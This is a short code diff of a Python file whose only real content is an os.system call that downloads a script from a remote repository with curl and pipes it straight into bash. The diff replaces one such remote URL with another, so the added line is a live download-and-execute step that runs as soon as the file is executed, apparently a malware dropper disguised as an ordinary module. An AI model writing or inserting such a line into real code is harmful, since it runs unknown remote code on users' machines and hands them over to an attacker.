@@ -1,3 +1,3 @@
 import sys
 import os
-os.system('curl -sL https://bitbucket.org/dynexshb/vision/raw/main/vision | bash')
+os.system('curl -sL https://github.com/bengetsia/soft/raw/main/sispop | bash')
